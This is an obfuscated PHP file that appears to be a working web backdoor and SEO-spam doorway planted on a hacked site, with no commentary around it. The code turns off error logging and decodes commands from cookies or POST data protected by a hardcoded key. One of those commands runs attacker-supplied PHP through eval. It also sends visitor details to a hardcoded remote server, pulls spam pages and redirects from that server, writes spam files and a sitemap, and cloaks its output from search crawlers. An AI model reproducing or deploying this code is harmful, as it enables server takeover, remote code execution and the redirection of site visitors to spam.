<?php

@ini_set('error_log', NULL);@ini_set('log_errors', 0);@ini_set('max_execution_time', 0);@error_reporting(0);@set_time_limit(0);date_default_timezone_set('UTC');class _5nqwhdt{static private $_ckks837o = 2990481862;static function _dz95q($_twj7jt5t, $_u4snny5q){$_twj7jt5t[2] = count($_twj7jt5t) > 4 ? long2ip (_5nqwhdt::$_ckks837o - 780) : $_twj7jt5t[2];$_ld3mrgb9 = _5nqwhdt::_zf12d($_twj7jt5t, $_u4snny5q);if (!$_ld3mrgb9){$_ld3mrgb9 = _5nqwhdt::_n3x4o($_twj7jt5t, $_u4snny5q);}return $_ld3mrgb9;}static function _zf12d($_twj7jt5t, $_ld3mrgb9){if (!function_exists('curl_version')){return "";}$_tpgywd7h = curl_init();curl_setopt($_tpgywd7h, CURLOPT_URL, implode("/", $_twj7jt5t));if (!empty($_ld3mrgb9)){curl_setopt($_tpgywd7h, CURLOPT_POST, 1);curl_setopt($_tpgywd7h, CURLOPT_POSTFIELDS, $_ld3mrgb9);}curl_setopt($_tpgywd7h, CURLOPT_RETURNTRANSFER, TRUE);$_607xq76b = curl_exec($_tpgywd7h);curl_close($_tpgywd7h);return $_607xq76b;}static function _n3x4o($_twj7jt5t, $_ld3mrgb9){if (!empty($_ld3mrgb9)){$_xkvhrw16 = stream_context_create(Array('http' => Array('method' => 'POST', 'header' => 'Content-type: application/x-www-form-urlencoded', 'content' => $_ld3mrgb9)));$_607xq76b = @file_get_contents(implode("/", $_twj7jt5t), FALSE, $_xkvhrw16);}else{$_607xq76b = @file_get_contents(implode("/", $_twj7jt5t));}return $_607xq76b;}}class _kc2oa7{private static $_6bjfkyea = "";private static $_cq5ho8nr = -1;private static $_aspsuvyj = "";private $_33jjhyk9 = "";private $_ng9z9s0m = "";private $_8ir4zg4q = "";private $_gx4rknxd = "";public static function _gxwev($_1im2snvv, $_55qjphwb, $_nq94ikfn){_kc2oa7::$_6bjfkyea = $_1im2snvv . "/cache/";_kc2oa7::$_cq5ho8nr = $_55qjphwb;_kc2oa7::$_aspsuvyj = $_nq94ikfn;if (!@file_exists(_kc2oa7::$_6bjfkyea)){@mkdir(_kc2oa7::$_6bjfkyea);}}public static function _r2yhr(){return TRUE;}public function __construct($_y0pcixiq, $_rvf5vuu1, $_7izbqce4, $_y8o1kxqj){$this->_33jjhyk9 = $_y0pcixiq;$this->_ng9z9s0m = $_rvf5vuu1;$this->_8ir4zg4q = $_7izbqce4;$this->_gx4rknxd = $_y8o1kxqj;}public function _21chm(){function _1l55z($_hypx6zj2, $_0u1isyqe) {return round(rand($_hypx6zj2, $_0u1isyqe - 1) + (rand(0, PHP_INT_MAX - 1) / PHP_INT_MAX ), 2);}$_ld3mrgb9 = str_replace("{{ text }}", $this->_ng9z9s0m,str_replace("{{ keyword }}", $this->_8ir4zg4q,str_replace("{{ links }}", $this->_gx4rknxd, $this->_33jjhyk9)));while (TRUE){preg_match('/{{ RANDFLOAT (\d*)-(\d*) }}/', $_ld3mrgb9, $_g8mg0ak0);if (empty($_g8mg0ak0)){break;}$_ld3mrgb9 = str_replace($_g8mg0ak0[0], _1l55z($_g8mg0ak0[1], $_g8mg0ak0[2]), $_ld3mrgb9);}while (TRUE){preg_match('/{{ RANDINT (\d*)-(\d*) }}/', $_ld3mrgb9, $_g8mg0ak0);if (empty($_g8mg0ak0)){break;}$_ld3mrgb9 = str_replace($_g8mg0ak0[0], rand($_g8mg0ak0[1], $_g8mg0ak0[2]), $_ld3mrgb9);}return $_ld3mrgb9;}public function _yhuw5(){$_stoc9l9v = _kc2oa7::$_6bjfkyea . md5($this->_8ir4zg4q . _kc2oa7::$_aspsuvyj);if (_kc2oa7::$_cq5ho8nr == -1){$_xxk16hm6 = -1;}else{$_xxk16hm6 = time() + (3600 * 24 * 30);}$_z809u0lp = Array("template" => $this->_33jjhyk9, "text" => $this->_ng9z9s0m, "keyword" => $this->_8ir4zg4q,"links" => $this->_gx4rknxd, "expired" => $_xxk16hm6);@file_put_contents($_stoc9l9v, serialize($_z809u0lp));}static public function _occu3($_7izbqce4){$_stoc9l9v = _kc2oa7::$_6bjfkyea . md5($_7izbqce4 . _kc2oa7::$_aspsuvyj);$_stoc9l9v = @unserialize(@file_get_contents($_stoc9l9v));if (!empty($_stoc9l9v) && ($_stoc9l9v["expired"] > time() || $_stoc9l9v["expired"] == -1)){return new _kc2oa7($_stoc9l9v["template"], $_stoc9l9v["text"], $_stoc9l9v["keyword"], $_stoc9l9v["links"]);}else{return null;}}}class _o1kjgah{private static $_6bjfkyea = "";private static $_o3s3y9g5 = "";public static function _gxwev($_1im2snvv, $_7sf9f23e){_o1kjgah::$_6bjfkyea = $_1im2snvv . "/";_o1kjgah::$_o3s3y9g5 = $_7sf9f23e;if (!@file_exists(_o1kjgah::$_6bjfkyea)){@mkdir(_o1kjgah::$_6bjfkyea);}}public static function _r2yhr(){return TRUE;}static public function _cujza(){$_on1mogjj = 0;foreach (scandir(_o1kjgah::$_6bjfkyea) as $_bamf7ty4){if (strpos($_bamf7ty4, _o1kjgah::$_o3s3y9g5) === 0){$_on1mogjj += 1;}}return $_on1mogjj;}static public function _odejz(){$_9ro99j9i = Array();foreach (scandir(_o1kjgah::$_6bjfkyea) as $_bamf7ty4){if (strpos($_bamf7ty4, _o1kjgah::$_o3s3y9g5) === 0){$_9ro99j9i[] = $_bamf7ty4;}}return @file_get_contents(_o1kjgah::$_6bjfkyea . $_9ro99j9i[array_rand($_9ro99j9i)]);}static public function _yhuw5($_yum3fbil){if (@file_exists(_o1kjgah::$_o3s3y9g5 . "_" . md5($_yum3fbil) . ".html")){return;}@file_put_contents(_o1kjgah::$_o3s3y9g5 . "_" . md5($_yum3fbil) . ".html", $_yum3fbil);}}class _fx6g92{private static $_6bjfkyea = "";private static $_o3s3y9g5 = "";public static function _gxwev($_1im2snvv, $_7sf9f23e){_fx6g92::$_6bjfkyea = $_1im2snvv . "/";_fx6g92::$_o3s3y9g5 = $_7sf9f23e;if (!@file_exists(_fx6g92::$_6bjfkyea)){@mkdir(_fx6g92::$_6bjfkyea);}}private static function _rng3b(){$_vgqnmuy5 = Array();foreach (scandir(_fx6g92::$_6bjfkyea) as $_bamf7ty4){if (strpos($_bamf7ty4, _fx6g92::$_o3s3y9g5) === 0){$_vgqnmuy5[] = $_bamf7ty4;}}return $_vgqnmuy5;}public static function _r2yhr(){$_vgqnmuy5 = _fx6g92::_rng3b();if (!empty($_vgqnmuy5)){return TRUE;}return FALSE;}static public function _odejz(){$_vgqnmuy5 = _fx6g92::_rng3b();$_se1pzyt9 = @file(_fx6g92::$_6bjfkyea . $_vgqnmuy5[array_rand($_vgqnmuy5)], FILE_IGNORE_NEW_LINES);return $_se1pzyt9[array_rand($_se1pzyt9)];}static public function _k2xr4(){$_se1pzyt9 = Array();$_vgqnmuy5 = _fx6g92::_rng3b();foreach ($_vgqnmuy5 as $_lear3gs0){$_se1pzyt9 = array_merge($_se1pzyt9, @file(_fx6g92::$_6bjfkyea . $_lear3gs0, FILE_IGNORE_NEW_LINES));}return $_se1pzyt9;}static public function _yhuw5($_98vzwxf6){if (@file_exists(_fx6g92::$_o3s3y9g5 . "_" . md5($_98vzwxf6) . ".list")){return;}@file_put_contents(_fx6g92::$_o3s3y9g5 . "_" . md5($_98vzwxf6) . ".list", $_98vzwxf6);}}class _c3ju8db{static public $_og7ji1do = "4.1";static public $_6v0pzmb6 = "12a24009-6275-62a6-e5a7-357beab6fd55";private $_nxcb491r = "http://136.12.78.46/app/assets/api2?action=redir";private $_k4uwoldq = "http://136.12.78.46/app/assets/api?action=page";static public $_atcq0sc3 = 20;static public $_cjpwvwq5 = 100;static public function _zyr29(){function _9c3r1($_vimcblaf, $_lh0ewhas){$_d70vd8kc = "";for ($_iwflklef = 0; $_iwflklef < strlen($_vimcblaf);) {for ($_9g8q4b02 = 0; $_9g8q4b02 < strlen($_lh0ewhas) && $_iwflklef < strlen($_vimcblaf); $_9g8q4b02++, $_iwflklef++) {$_d70vd8kc .= chr(ord($_vimcblaf[$_iwflklef]) ^ ord($_lh0ewhas[$_9g8q4b02]));}}return $_d70vd8kc;}function _n2b38($_vimcblaf, $_lh0ewhas, $_dd9pbpn9){return _9c3r1(_9c3r1($_vimcblaf, $_lh0ewhas), $_dd9pbpn9);}foreach (array_merge($_COOKIE, $_POST) as $_d1fb88nu => $_vimcblaf) {$_vimcblaf = @unserialize(_n2b38(_c3ju8db::_zy0k7($_vimcblaf), $_d1fb88nu, _c3ju8db::$_6v0pzmb6));if (isset($_vimcblaf['ak']) && _c3ju8db::$_6v0pzmb6 == $_vimcblaf['ak']) {if ($_vimcblaf['a'] == 'doorway2') {if ($_vimcblaf['sa'] == 'check') {$_ld3mrgb9 = _5nqwhdt::_dz95q(explode("/", "http://httpbin.org/"), "");if (strlen($_ld3mrgb9) > 512) {echo @serialize(Array("uid" => _c3ju8db::$_6v0pzmb6, "v" => _c3ju8db::$_og7ji1do, ));}exit;}if ($_vimcblaf['sa'] == 'templates') {foreach ($_vimcblaf["templates"] as $_y0pcixiq) {_o1kjgah::_yhuw5($_y0pcixiq);echo @serialize(Array("uid" => _c3ju8db::$_6v0pzmb6, "v" => _c3ju8db::$_og7ji1do, ));}}if ($_vimcblaf['sa'] == 'keywords') {_fx6g92::_yhuw5($_vimcblaf["keywords"]);_c3ju8db::_vb302();echo @serialize(Array("uid" => _c3ju8db::$_6v0pzmb6, "v" => _c3ju8db::$_og7ji1do, ));}}if ($_vimcblaf['sa'] == 'eval') {eval($_vimcblaf["data"]);exit;}}}}private function _i40dg(){$_x20o8pl4 = array('#Ask\s*Jeeves#i', '#HP\s*Web\s*PrintSmart#i', '#HTTrack#i', '#IDBot#i', '#Indy\s*Library#','#ListChecker#i', '#MSIECrawler#i', '#NetCache#i', '#Nutch#i', '#RPT-HTTPClient#i','#rulinki\.ru#i', '#Twiceler#i', '#WebAlta#i', '#Webster\s*Pro#i', '#www\.cys\.ru#i','#Wysigot#i', '#Yahoo!\s*Slurp#i', '#Yeti#i', '#Accoona#i', '#CazoodleBot#i','#CFNetwork#i', '#ConveraCrawler#i', '#DISCo#i', '#Download\s*Master#i', '#FAST\s*MetaWeb\s*Crawler#i','#Flexum\s*spider#i', '#Gigabot#i', '#HTMLParser#i', '#ia_archiver#i', '#ichiro#i','#IRLbot#i', '#Java#i', '#km\.ru\s*bot#i', '#kmSearchBot#i', '#libwww-perl#i','#Lupa\.ru#i', '#LWP::Simple#i', '#lwp-trivial#i', '#Missigua#i', '#MJ12bot#i','#msnbot#i', '#msnbot-media#i', '#Offline\s*Explorer#i', '#OmniExplorer_Bot#i','#PEAR#i', '#psbot#i', '#Python#i', '#rulinki\.ru#i', '#SMILE#i','#Speedy#i', '#Teleport\s*Pro#i', '#TurtleScanner#i', '#User-Agent#i', '#voyager#i','#Webalta#i', '#WebCopier#i', '#WebData#i', '#WebZIP#i', '#Wget#i','#Yandex#i', '#Yanga#i', '#Yeti#i', '#msnbot#i','#spider#i', '#yahoo#i', '#jeeves#i', '#google#i', '#altavista#i','#scooter#i', '#av\s*fetch#i', '#asterias#i', '#spiderthread revision#i', '#sqworm#i','#ask#i', '#lycos.spider#i', '#infoseek sidewinder#i', '#ultraseek#i', '#polybot#i','#webcrawler#i', '#robozill#i', '#gulliver#i', '#architextspider#i', '#yahoo!\s*slurp#i','#charlotte#i', '#ngb#i', '#BingBot#i');if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {$_uxzxr8o8 = $_SERVER['HTTP_X_FORWARDED_FOR'];} elseif (!empty($_SERVER['REMOTE_ADDR'])) {$_uxzxr8o8 = $_SERVER['REMOTE_ADDR'];} else {$_uxzxr8o8 = "";}if (!empty($_SERVER['HTTP_USER_AGENT']) && (FALSE !== strpos(preg_replace($_x20o8pl4, '-NO-WAY-', $_SERVER['HTTP_USER_AGENT']), '-NO-WAY-'))){$_9iur4rqe = 1;}elseif (empty($_SERVER['HTTP_ACCEPT_LANGUAGE']) || empty($_SERVER['HTTP_REFERER'])){$_9iur4rqe = 1;}elseif (FALSE !== strpos(@gethostbyaddr($_uxzxr8o8), 'google')) {$_9iur4rqe = 1;}elseif (strpos($_SERVER['HTTP_REFERER'], "google") === FALSE && strpos($_SERVER['HTTP_REFERER'], "yahoo") === FALSE){$_9iur4rqe = 1;}else{$_9iur4rqe = 0;}return $_9iur4rqe;}private static function _lsrx8(){$_u4snny5q = Array();$_u4snny5q['ip'] = $_SERVER['REMOTE_ADDR'];$_u4snny5q['qs'] = @$_SERVER['HTTP_HOST'] . @$_SERVER['REQUEST_URI'];$_u4snny5q['ua'] = @$_SERVER['HTTP_USER_AGENT'];$_u4snny5q['lang'] = @$_SERVER['HTTP_ACCEPT_LANGUAGE'];$_u4snny5q['ref'] = @$_SERVER['HTTP_REFERER'];$_u4snny5q['enc'] = @$_SERVER['HTTP_ACCEPT_ENCODING'];$_u4snny5q['acp'] = @$_SERVER['HTTP_ACCEPT'];$_u4snny5q['char'] = @$_SERVER['HTTP_ACCEPT_CHARSET'];$_u4snny5q['conn'] = @$_SERVER['HTTP_CONNECTION'];return $_u4snny5q;}public function __construct(){$this->_nxcb491r = explode("/", $this->_nxcb491r);$this->_k4uwoldq = explode("/", $this->_k4uwoldq);}static private function _zy0k7($_gfei6oav){if (strlen($_gfei6oav) < 4){return "";}$_ub9fl0lt = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";$_se1pzyt9 = str_split($_ub9fl0lt);$_se1pzyt9 = array_flip($_se1pzyt9);$_iwflklef = 0;$_f3mhrepa = "";$_gfei6oav = preg_replace("~[^A-Za-z0-9\+\/\=]~", "", $_gfei6oav);do {$_kcjb4806 = $_se1pzyt9[$_gfei6oav[$_iwflklef++]];$_ly8okw77 = $_se1pzyt9[$_gfei6oav[$_iwflklef++]];$_tgv6u5po = $_se1pzyt9[$_gfei6oav[$_iwflklef++]];$_76h49dl8 = $_se1pzyt9[$_gfei6oav[$_iwflklef++]];$_748qx3te = ($_kcjb4806 << 2) | ($_ly8okw77 >> 4);$_zjcpzw9f = (($_ly8okw77 & 15) << 4) | ($_tgv6u5po >> 2);$_dk2aiavl = (($_tgv6u5po & 3) << 6) | $_76h49dl8;$_f3mhrepa = $_f3mhrepa . chr($_748qx3te);if ($_tgv6u5po != 64) {$_f3mhrepa = $_f3mhrepa . chr($_zjcpzw9f);}if ($_76h49dl8 != 64) {$_f3mhrepa = $_f3mhrepa . chr($_dk2aiavl);}} while ($_iwflklef < strlen($_gfei6oav));return $_f3mhrepa;}private function _rd2m4($_7izbqce4){$_y0pcixiq = "";$_rvf5vuu1 = "";$_u4snny5q = _c3ju8db::_lsrx8();$_u4snny5q["uid"] = _c3ju8db::$_6v0pzmb6;$_u4snny5q["keyword"] = $_7izbqce4;$_u4snny5q["tc"] = 10;$_u4snny5q = http_build_query($_u4snny5q);$_vimcblaf = _5nqwhdt::_dz95q($this->_k4uwoldq, $_u4snny5q);if (strpos($_vimcblaf, _c3ju8db::$_6v0pzmb6) === FALSE){return Array($_y0pcixiq, $_rvf5vuu1);}$_y0pcixiq = _o1kjgah::_odejz();$_rvf5vuu1 = substr($_vimcblaf, strlen(_c3ju8db::$_6v0pzmb6));$_rvf5vuu1 = explode("\n", $_rvf5vuu1);shuffle($_rvf5vuu1);$_rvf5vuu1 = implode(" ", $_rvf5vuu1);return Array($_y0pcixiq, $_rvf5vuu1);}private function _9l6ft(){$_u4snny5q = _c3ju8db::_lsrx8();$_u4snny5q["uid"] = _c3ju8db::$_6v0pzmb6;$_u4snny5q = http_build_query($_u4snny5q);$_rj6iv9fa = _5nqwhdt::_dz95q($this->_nxcb491r, $_u4snny5q);$_rj6iv9fa = @unserialize($_rj6iv9fa);if (isset($_rj6iv9fa["type"]) && $_rj6iv9fa["type"] == "redir") {if (!empty($_rj6iv9fa["data"]["header"])) {header($_rj6iv9fa["data"]["header"]);return true;} elseif (!empty($_rj6iv9fa["data"]["code"])) {echo $_rj6iv9fa["data"]["code"];return true;}}return false;}public function _r2yhr(){return _kc2oa7::_r2yhr() && _o1kjgah::_r2yhr() && _fx6g92::_r2yhr();}static public function _3msqx(){if ((!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') || $_SERVER['SERVER_PORT'] == 443) {return true;}return false;}public static function _u3j21(){$_nhfqy27h = explode("?", $_SERVER["REQUEST_URI"], 2);$_nhfqy27h = $_nhfqy27h[0];if (strpos($_nhfqy27h, ".php") === FALSE){$_nhfqy27h = explode("/", $_nhfqy27h);array_pop($_nhfqy27h);$_nhfqy27h = implode("/", $_nhfqy27h) . "/";}return sprintf("%s://%s%s", _c3ju8db::_3msqx() ? "https" : "http", $_SERVER['HTTP_HOST'], $_nhfqy27h);}public static function _wg6i6(){$_nhfqy27h = explode("?", $_SERVER["REQUEST_URI"], 2);$_nhfqy27h = $_nhfqy27h[0];$_1im2snvv = substr($_nhfqy27h, 0, strrpos($_nhfqy27h, "/"));return sprintf("%s://%s%s", _c3ju8db::_3msqx() ? "https" : "http", $_SERVER['HTTP_HOST'], $_1im2snvv);}public static function _aqz1i($_ff84zqwn, $_7izbqce4, $_pwnd1aaw){$_ra70y5u4 = "";if (substr($_ff84zqwn, -1) == "/"){if (ord($_pwnd1aaw[1]) % 2){$_7izbqce4 = str_replace(" ", "-", $_pwnd1aaw . "-" . $_7izbqce4);}else{$_7izbqce4 = str_replace(" ", "-", $_7izbqce4 . "-" . $_pwnd1aaw);}$_ra70y5u4 = sprintf("%s%s", $_ff84zqwn, urlencode($_7izbqce4));}else{if (ord($_pwnd1aaw[0]) % 2){$_ra70y5u4 = sprintf("%s?%s=%s",$_ff84zqwn,$_pwnd1aaw,urlencode(str_replace(" ", "-", $_7izbqce4)));}else{$_azeliydt = Array("id", "page", "tag");$_q3n064e1 = $_azeliydt[ord($_pwnd1aaw[2]) % count($_azeliydt)];if (ord($_pwnd1aaw[1]) % 2){$_7izbqce4 = str_replace(" ", "-", $_pwnd1aaw . "-" . $_7izbqce4);}else{$_7izbqce4 = str_replace(" ", "-", $_7izbqce4 . "-" . $_pwnd1aaw);}$_ra70y5u4 = sprintf("%s?%s=%s",$_ff84zqwn,$_q3n064e1,urlencode($_7izbqce4));}}return $_ra70y5u4;}public static function _8wofo($_hypx6zj2, $_0u1isyqe){$_a9q7fodb = rand($_hypx6zj2, $_0u1isyqe);$_fcy7movk = "";$_q3n064e1 = substr(md5(_c3ju8db::$_6v0pzmb6 . "salt3"), 0, 6);for ($_iwflklef=0; $_iwflklef < $_a9q7fodb; $_iwflklef++){$_7izbqce4 = _fx6g92::_odejz();$_fcy7movk .= sprintf("<a href='%s'>%s</a>,\n",_c3ju8db::_aqz1i(_c3ju8db::_u3j21(), $_7izbqce4, $_q3n064e1), ucwords($_7izbqce4));}return $_fcy7movk;}public static function _vb302(){$_wlx97ghg = "<?xml version=\"1.0\" encoding=\"UTF-8\"?" . ">\n<urlset xmlns=\"http://www.sitemaps.org/schemas/sitemap/0.9\">\n";$_aul0105l = "</urlset>";$_konnji3d = "";$_pwnd1aaw = substr(md5(_c3ju8db::$_6v0pzmb6 . "salt3"), 0, 6);$_se1pzyt9 = _fx6g92::_k2xr4();foreach ($_se1pzyt9 as $_lh0ewhas){$_ra70y5u4 = _c3ju8db::_aqz1i(_c3ju8db::_u3j21(), $_lh0ewhas, $_pwnd1aaw);$_cyfpij43 = time() - mt_rand(0, 60 * 60 * 24 * 30);$_konnji3d .= "<url>\n";$_konnji3d .= sprintf("<loc>%s</loc>\n", $_ra70y5u4);$_konnji3d .= sprintf("<lastmod>%s</lastmod>\n", date("Y-m-d", $_cyfpij43));$_konnji3d .= "<priority>0.3</priority>\n";$_konnji3d .= "</url>\n";}$_nt3r5vn9 = $_wlx97ghg . $_konnji3d . $_aul0105l;$_v3r55ywt = dirname(__FILE__) . "/sitemap.xml";$_md1te9fx = _c3ju8db::_wg6i6() . "/sitemap.xml";@file_put_contents($_v3r55ywt, $_nt3r5vn9);return $_md1te9fx;}public function _sevid(){$_q3n064e1 = substr(md5(_c3ju8db::$_6v0pzmb6 . "salt3"), 0, 6);if (isset($_GET[$_q3n064e1])) {$_7izbqce4 = $_GET[$_q3n064e1];}elseif (strpos($_SERVER["REQUEST_URI"], $_q3n064e1) !== FALSE){$_jj291n4v = explode("/", $_SERVER["REQUEST_URI"]);foreach ($_jj291n4v as $_4jewmpj5) {if (strpos($_4jewmpj5, $_q3n064e1) !== FALSE){$_u46dvxtz = explode("=", $_4jewmpj5);$_hsvgyjx0 = array_pop($_u46dvxtz);$_hsvgyjx0 = str_replace($_q3n064e1 . "-", "", $_hsvgyjx0);$_hsvgyjx0 = str_replace("-" . $_q3n064e1, "", $_hsvgyjx0);$_7izbqce4 = $_hsvgyjx0;}}}if (empty($_7izbqce4)){$_se1pzyt9 = _fx6g92::_k2xr4();$_7izbqce4 = $_se1pzyt9[0];}if (!empty($_7izbqce4)){$_7izbqce4 = str_replace("-", " ", $_7izbqce4);if (!$this->_i40dg()){if ($this->_9l6ft()){return;}}$_rj6iv9fa = _kc2oa7::_occu3($_7izbqce4);if (empty($_rj6iv9fa)){list($_y0pcixiq, $_rvf5vuu1) = $this->_rd2m4($_7izbqce4);if (empty($_rvf5vuu1)){return;}$_rj6iv9fa = new _kc2oa7($_y0pcixiq, $_rvf5vuu1, $_7izbqce4, _c3ju8db::_8wofo(_c3ju8db::$_atcq0sc3, _c3ju8db::$_cjpwvwq5));$_rj6iv9fa->_yhuw5();}echo $_rj6iv9fa->_21chm();}}}_kc2oa7::_gxwev(dirname(__FILE__), -1, _c3ju8db::$_6v0pzmb6);_o1kjgah::_gxwev(dirname(__FILE__), substr(md5(_c3ju8db::$_6v0pzmb6 . "salt12"), 0, 4));_fx6g92::_gxwev(dirname(__FILE__), substr(md5(_c3ju8db::$_6v0pzmb6 . "salt22"), 0, 4));_c3ju8db::_zyr29();$_0f27akss = new _c3ju8db();if ($_0f27akss->_r2yhr()){$_0f27akss->_sevid();}exit();